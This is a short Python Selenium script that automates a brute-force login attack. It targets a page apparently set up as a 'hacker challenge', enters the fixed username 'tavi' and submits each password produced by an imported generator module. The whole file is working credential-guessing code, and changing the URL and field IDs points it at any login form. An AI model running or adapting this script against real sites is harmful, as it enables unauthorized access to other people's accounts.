from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.remote.webelement import WebElement

import brutus_de3


def try_user(driver,password):
    user_input=driver.find_element(By.ID,"username")
    user_input.send_keys("tavi")
    password_input=driver.find_element(By.ID,"password")
    password_input.send_keys(password)
    print(password)
    password_input.send_keys(Keys.ENTER)

driver = webdriver.Chrome()
driver.get("https://multibit.ro/hacker-challenge")
all_passwords=brutus_de3.comb_alt()
for item in all_passwords:
    try_user(driver,item)